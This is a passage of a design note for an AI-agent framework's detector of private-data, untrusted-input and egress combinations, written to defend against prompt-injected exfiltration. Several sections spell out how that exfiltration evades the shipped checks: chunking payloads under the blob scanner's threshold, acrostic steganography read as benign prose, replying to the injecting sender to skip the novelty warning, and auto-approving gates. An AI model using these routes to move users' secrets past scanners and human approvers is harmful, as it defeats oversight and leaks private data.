seam that can answer before the human is asked at all. So the naive reading
— *a human is in the path ⇒ `human_approver` ⇒ soft* — makes bash soft too,
and with it **every loud verdict in the repo**: pikuri-code over a private
repo, pikuri-computer in both modes. A detector whose top level is
unreachable is exactly as useless as one that always fires.

The tempting rescue is frequency/salience: bash confirmations come by the
dozen and get rubber-stamped, a compose window is rare and irreversible.
**Inadmissible** — that is attention quality, i.e. the same
effectiveness question that bars scanners from promoting the seat
(next sub-section). Grade attention and trust-the-approver is back at a
finer grain.

The admissible test is structural:

> **Does the human see the bytes that leave, or only a proxy for them?**

- **Compose window → `egress_human_approver`.** The payload *is* the
  reviewed artifact: what is on screen is what egresses, byte for byte.
- **`agent` with `editable: true` → `egress_human_approver`** (author if
  actually retyped). The task string *is* the bytes crossing into the
  egress-holder's reach.
- **Bash behind a confirmer → stays hard `:egress`.** The human approves a
  *command* — a **program**, not a payload. Behind a pipe, a heredoc, a
  script file, `$(…)`, the egressing bytes are computed at runtime and were
  never on screen. Approving `curl` approves an *intent*.
- **A mail attachment → hard `:egress`** (hypothetical — pikuri-thunderbird
  ships none, see below). A key in a `.png`'s low bits is invisible to any
  reader; the human approves a *filename* and a thumbnail. Structurally
  identical to `curl`: an approved **reference** to bytes nobody saw.

This is derived from structure, not from trusting anyone's diligence, and
it is the rule a tool author can actually apply to self-tag — which the
lattice otherwise lacks (`Sandbox#egress?`'s "ask the object for its
posture" needs a question the object can answer).

Consequence for the dry-run: pikuri-code **stays loud** (bash is genuine
autonomous-payload egress with a human blessing the wrapper) while the
Thunderbird/researcher seats drop to **soft**. That is the contrast
finding #2 was asking for — see the revised table under "Results".

**Do not merge this with `:egress_writeonly`.** Write-only grades
*attacker readability of the response*; payload visibility grades *what
the human saw*. Genuinely orthogonal — a readable human-gated egress and a
blind autonomous one are different animals. The 2-D (untrusted × egress)
grid stays 2-D; nobody builds the third axis while write-only is still
unreachable for want of a search-only persona.

#### The attachment corollary: constrain the surface, not just the seat

*Graduated 2026-08-08 — the invariant ("the outbound surface may contain
only fields whose rendering is their content") and its derivation live in
`pikuri-thunderbird/DESIGN.md` §"Why no attachments", the CLAUDE.md
Thunderbird seam, and the grep tripwire there. Enforced by construction:
`MailtoUri`'s five-parameter allowlist, no `ATTACH` in `IcsEvent`.*

What stays here is the detector-side consequence, still unbuilt: an egress
tool's level is not a fixed property of the tool, it's a property of its
**current field set** — so read the level from the tool, never from a table
keyed on tool name. Open item 2 adds the other half (it also depends on the
tool's runtime gate).

#### Bandwidth is not a safety property (the entropy table)

*Graduated 2026-08-08. The argument — the entropy floor, the transcription
price that a tool-less agent actually pays, the drip across many short
queries, and the "don't offer it as reassurance" consequence — is now
taught in `book/07-os-assistant.md` §"Why 'too big to hide' is not a
defense" and stated for the mail seat in `pikuri-thunderbird/DESIGN.md`.
The same pass softened ch7's two "forces a conspicuous blob" claims, which
were the reassurance this section forbids.*

*Corrected while graduating: the original table priced every secret at its
**entropy**, which assumes the agent can pack a key into an optimal
acrostic — bit-level base conversion, which an LLM does badly. The price an
agent can actually pay is **transcription** of the secret's on-disk
characters (~400 words for an `id_ed25519`, ~1600 for an RSA PEM). Which
one applies is a property of the wiring: local compute reaches the floor,
and a network-severed sandbox still computes. The conclusion is unchanged —
the drip removes the ceiling either way.*

What stays here is the detector-side consequence, still unbuilt: **don't
encode bandwidth in the detector.** It's a degree, like scanner strength —
same reason, same answer. Attachments are in scope because they're
*structural*; stego capacity is not.

#### Scanners harden the approver seat — but bound, they don't close (and must not promote it)

Most of this confirmer hardening is **already shipped** in
`Pikuri::Thunderbird::ComposeGuard` + `Pikuri::Sanitizer` (verified, not
assumed):

- **recipient novelty** — `ComposeGuard#novelty_note` via
  `Gloda::Contacts#domains_seen`. A soft warn (keep-in-draft) on a
  recipient *domain* the user has no prior mail with — soft because a
  hard reject would fire on every genuinely-new correspondent.
- **plaintext body + Unicode/control/bidi/zero-width/homoglyph** — the
  body **fail-closes** on any `Sanitizer` warning (stronger than a warn:
  nothing is handed off, the human retypes in Thunderbird); addresses are
  hard-dropped if non-ASCII or punycode.
- **encoded / high-entropy blob** — **shipped** after all
  (`ComposeGuard#body_blob_note`, a soft-warn, deliberately *not* in the
  finite-codepoint `Sanitizer`); the design graduated to
  `D-blob-spotter-alphabets` +
  {Pikuri::Thunderbird::ComposeGuard#body_blob_note}. It
  now covers base64 (3-class) plus single-case hex and base32 at longer
  thresholds. Still a *note*, not a fail-close, and still walked under by
  splitting the payload into sub-threshold chunks — a paste guard, not an
  exfil control.

Good defense-in-depth. Two things they still do **not** do:

1. **They don't close the channel.** They force the attacker down the
   ladder exactly as the note's patient-approval bound predicts: past
   base64 (→ base32/hex/spelled-out), past Unicode stego (→ ASCII), down to
   **linguistic steganography the scanners and the human both read as
   benign prose** — the user's acrostic ("I think dogs are super cute" →
   `itdasc`), word-choice, sentence count. Low-bandwidth, but enough for a
   password/key over a few messages. And the **recipient novelty check is
   *bypassed*, not just weakened**, in the sharpest case (verified in
   `Gloda::Contacts#domains_seen`: it reads the `identities` table, which
   collects authors *and* recipients — so received mail counts): the
   injecting email's own `From`-domain is already "seen", so *reply to the
   injector* draws **no warning at all** — and the attacker receives the
   reply. So the surviving exfil is: linguistic-stego body +
   reply-to-injector — zero red flags, no warning to ignore. (It's also
   per-*domain*, so a fresh address at an already-seen domain is silent
   too.)
2. **They must not promote `human_approver` → `human_author` in the
   detector.** Scanner *effectiveness* ("does it catch the acrostic?") is
   precisely the data-flow question the detector refuses to answer;
   grading approver-quality by scanner strength relaunches trust-the-
   approver at finer grain and would lull users into trusting a screen that
   demonstrably misses linguistic stego. The detector grades the
   **structural** egress class (who authors the bytes); scanners live on
   the **confirmer** as runtime hardening, documented as bound-not-closed.
   Author-mode is the only thing that reaches `info`, because clean-by-
   construction is a *proof*, not a mitigation-of-degree.

#### Still to brainstorm: is strict author-mode even reachable?

The grid rests `info` entirely on `egress_human_author` = "the human
types the outbound bytes from scratch, no pre-fill." But **every real UX
wants to pre-fill something** — a blank compose window when the LLM
already knows the recipient and gist is hostile ergonomics, so the
product pressure is always toward pre-fill, and the moment it pre-fills we
are back at `human_approver`. So the clean-by-construction proof may name
a seat that no shippable chrome actually offers. Open questions for the
revisit: is there a *partial* author-mode that keeps the proof (e.g.
pre-fill the recipient + subject — the parts the human can verify at a
glance — but force the human to type the **body** blind, since the body is
the exfil channel)? Or is "author-mode" honest only as a spec-level ideal,
and every real Thunderbird/terminal seat is `human_approver` with the
scanners doing what they can? If the latter, the grid's `info` cells are
aspirational and `soft` is the best any *built* thing gets — worth saying
plainly rather than implying a wiring exists that reaches `info`.

*Continued in review item 7 below, which argues the framing here blames the
wrong thing: pre-fill is a symptom, **drafting** is the blocker, and the
answer is therefore per-seat rather than global.*

## Open items from the 2026-08-08 review pass

Raised by reading the note against the actual wiring after the graded-egress
fold-in. Items 1–5 are **ship-blocking for v1** — each is a rule the
implementer would otherwise have to invent; 6–7 are sharpenings that change
what we claim, not what we build.

### 1. Does a gated delegation *cap* the propagated egress leg? (series vs parallel)

The contradiction that forced this list. v1 says the boundary relabel is
identity for egress ("an egress level survives the boundary at its own
strength"), so `RESEARCHER`'s hard `fetch` propagates up hard and
**pikuri-computer's default mode is loud**, not soft. But the revised
dry-run table wanted soft, on the grounds that the only parent→outside
channel is the *editable task string* the human authored — i.e. it silently
let the gate attenuate the propagated leg, which is exactly the propagation
exception v1's last bullet forbids.

Both readings are defensible and they disagree on the flagship demo, so it
has to be decided, not left implicit. The proposal worth testing:

> **Union at a node is `max` (parallel legs). Propagation through a gated
> channel is `min` (series — the weakest link bounds what can cross).**

The direction asymmetry then falls out instead of being stipulated: the
**outbound** path (parent → child, gated by the confirmer on the task
string) takes the min-cap, so a `human_approver` delegation caps a hard-
egress child at approver; the **inbound** path (the child's return value,
ungated) is where `untrusted` attenuates by the instruction/content
argument. One rule, both relabels, and it re-hardens automatically when the
delegation isn't gated (item 2).

What to check before adopting it: does min-cap ever *under*-warn? The child
is bounded by the task string only if it holds no private data of its own
and cannot be steered by what it reads mid-task into egressing more than
the task carried — the second half is not obviously true for a researcher
that `fetch`es attacker-authored pages and then `fetch`es again.

### 2. The egress *level* is a property of the wiring, not just the field set

"Read the level from the tool, not from a table keyed on tool name" (the
attachment corollary's field-set half) is
right but not sufficient: `agent(editable: true)` reaches
`egress_human_approver` only if its injected `Confirmer` can actually ask a
human, and `--no-confirm` swaps in `Confirmer::AUTO_APPROVE`
(`pikuri-os/bin/pikuri-computer:92`, `pikuri-os/bin/pikuri-os:85`). Same
shape twice more: `--no-sandbox` un-severs the bash leg the revised table
scores as "none", and `Code::Bash`'s `passive_detector` seam can pre-approve
before any human is asked.

So the demo's soft verdict would survive `--no-confirm` unchanged — the
precise flavour of false reassurance this whole note exists to refuse.
Needed rule, roughly: *a gate contributes a level only if it can block on a
human; an auto-approving or pre-approving gate contributes none, and the
tool falls back to autonomous.* Which means the level is computed from the
tool **plus its runtime collaborators**, at wiring time.

### 3. MCP tools are invisible to the detector — and they arrive mid-session

Per the MCP-tool bypass seam, MCP tools are raw `RubyLLM::Tool` subclasses
with no pikuri tag surface, yet an MCP server is the archetypal
untrusted+egress leg. Worse for the "once per process at boot" plan:
`mcp_connect` (`Mcp::Servers#build_mcp_connect_tool`) adds them *after* the
Configurator block has run. v1 currently says nothing, and silence reads as
"no legs" — the one reading we know is wrong.

Cheapest answer consistent with tag-generously: **an untagged / foreign
tool defaults to `{untrusted, egress}`**, and a runtime `mcp_connect`
re-evaluates the tree (which also settles what "once per process" keys on —
per verdict-change, not per process). Alternative: declare MCP out of scope
and say so *in the warning text*, since an unstated exclusion is worse than
a loud one.

### 4. Local-file-read `:untrusted` must land in the v1 vocabulary (elevates parked thread 2)

Not a new question — it's the tag-table-vs-narrative gap already parked at
the top — but the review makes it **ship-blocking** rather than merely
open: every dry-run verdict depends on the *yes*, and the v1 list never
mentions the untrusted default for file tools or the all-trusted-workspace
opt-out. Under the tag table as literally written, pikuri-code over a
private repo is `{private, egress}` → **silent**, contradicting its own
dry-run row. Whatever the answer, v1 has to state it in the vocabulary
bullet next to `private:`.

### 5. No implementation seam is named

For "ready to build" the note still owes: where the tags live on
`Pikuri::Tool` (a method? a `Data` record? how does a tool whose level
depends on collaborators expose it — item 2); `Sandbox#egress?`, which
**does not exist yet** (nothing in `pikuri-code/lib/pikuri/code/bash/sandbox.rb`
answers posture, so the "ask the object" rule has no receiver);
`Filesystem(private:, trusted:)`; when the tree walk runs (Configurator
close, after the user block, so `add_tool`/`add_extension` have all fired);
how personas resolve `tool_names` → tools for the sub-agent nodes; and
where the report is emitted. None of these is hard; all of them are
decisions someone will otherwise make silently and differently.

### 6. v1 buys exactly one bit per lattice — say so

With `info` out of scope, the two lattices collapse to a single rule:
**loud iff `private` ∧ hard-`untrusted` ∧ autonomous-`egress`; soft iff all
three legs present at any strength; silent otherwise.** The lattices still
earn their keep for union *at* a node, but the verdict function is a 2×2 —
worth one line in the v1 section so nobody builds a general lattice engine
for it, and worth knowing when a third level is proposed later.

### 7. Author-mode's real blocker is *drafting*, not pre-fill

Sharpens "is strict author-mode even reachable?" above. The note blames
pre-fill UX; the deeper obstacle is that **if the agent displays a proposed
body, a human who retypes it is a pre-fill with extra steps** — the
clean-by-construction proof needs the human to *ignore* the proposal, which
no drafting UX will ever produce (removing the pre-fill just moves the
transcription through the terminal, or the clipboard).

That makes the answer per-seat rather than global, which is more useful
than either horn of the original question:

- **A seat whose job is to draft the payload** (Thunderbird compose)
  **cannot reach `egress_human_author`.** The `info` cell is aspirational
  there, permanently — not for want of the right chrome.
- **A seat where the human's own intent originates the bytes** *can*. A
  researcher prompt that asks "what should I look up?" with a **blank**
  field is genuine author-mode; pikuri-os is one pre-fill removal from it,
  at a real ergonomic cost worth pricing rather than assuming.

If that holds, the "partial author-mode" idea (pre-fill recipient +
subject, blind-typed body) is *not* a rescue for compose — the human still
types a body they were just shown.

## Open: propagating this to docs + example scripts

Independent of the five open items above (this is about presentation, not
the rule set): how it shows up to a *reader* is unsettled. To
brainstorm next (the *what*, not yet the technical *how*):

- Which `bin/pikuri-*` and `book/` examples deliberately *should*
  trip the detector as a teaching moment, and which should be wired to
  stay quiet so the contrast is legible.
- Where the named concepts (`:private` as a user-declared property,
  loud vs soft, "separation raises the bar but doesn't break it") get a
  guide chapter — likely alongside `06-security.md` /
  `09-security-revisited.md`.
- Whether the detector's output is purely a log line or also a
  documented `Agent`-level query a host can render.
- How it reads next to the typed-transport-classes idea so the two
  privacy stories (endpoint-private vs agent-holds-the-legs) don't
  confuse.

## v1 scope, in one place

*Revised 2026-08-08: the graded egress axis is in, at two levels. The
earlier flat-`:egress` version of this list is superseded.*

**Five holes, marked inline as ⛔ — this list is not yet buildable.** See
"Open items from the 2026-08-08 review pass"; each ⛔ names the item that
has to close first.

- Tags `:private` (user, default off) / `:untrusted` / `:egress`
  (framework, default on) / `:untrusted_weakened` (computed) /
  `:egress_human_approver` (declared by the tool). ⛔ **item 4** — the
  vocabulary still owes the `:untrusted` default for *file-read* tools +
  the all-trusted-workspace opt-out; ⛔ **item 3** — and the default for a
  foreign/untagged tool (MCP), which arrives at runtime.
- `:private` declared on the workspace/corpus; file tools inherit it.
  Exception: domain-inherently-private tools (Thunderbird mail/calendar)
  carry it by default.
- Two lattices, union = max on each:
  `none < untrusted_weakened < untrusted` and
  `none < egress_human_approver < egress`.
- Egress level is set by **payload visibility** — the human sees the
  literal outbound bytes (compose window, editable task string) →
  `egress_human_approver`; the human sees a proxy (a bash command line) →
  hard `:egress`. ⛔ **item 2** — visibility is necessary, not sufficient:
  the level also depends on whether the tool's *gate* can block on a human
  at all (`AUTO_APPROVE`, `passive_detector`, `--no-sandbox`).
- Boundary relabel: `untrusted→untrusted_weakened`, everything else
  identity (an egress level survives the boundary at its own strength).
  ⛔ **item 1** — this is what makes pikuri-computer's default mode loud;
  if a gated delegation caps the propagated leg instead (series = min), it
  is soft. The flagship verdict hangs on this bullet.
- Evaluate every node; verdict = max over tree; report the path.
- Verdict grid, `:private` present:

  | egress ↓ / untrusted → | hard | weakened |
  |---|---|---|
  | autonomous | **loud** | soft |
  | human_approver | **soft** | soft |

  Equivalently, and this is all v1 needs (item 6): **loud** iff `private` ∧
  hard-`untrusted` ∧ autonomous-`egress`; **soft** iff all three legs are
  present at any strength; **silent** otherwise.

- **Not** in v1: `egress_human_author` / the `info` cell (unreachable in
  every built seat — pre-fill demotes it; keep it a spec-level ideal) and
  `:egress_writeonly` (changes no current verdict).
- Warn-only, once per process, message names the leg to break. ⛔ **item 3**
  — "once per process" is wrong if `mcp_connect` can add legs mid-session;
  key the dedup on the verdict, not the process.
- No custom legs, no per-persona knobs, no propagation exceptions, and no
  grading of approver *quality* (scanner strength, attention, frequency).
- ⛔ **item 5** — no implementation seam is named yet: tag storage on
  `Pikuri::Tool`, the missing `Sandbox#egress?` receiver,
  `Filesystem(private:, trusted:)`, when the tree walk runs, where the
  report goes.
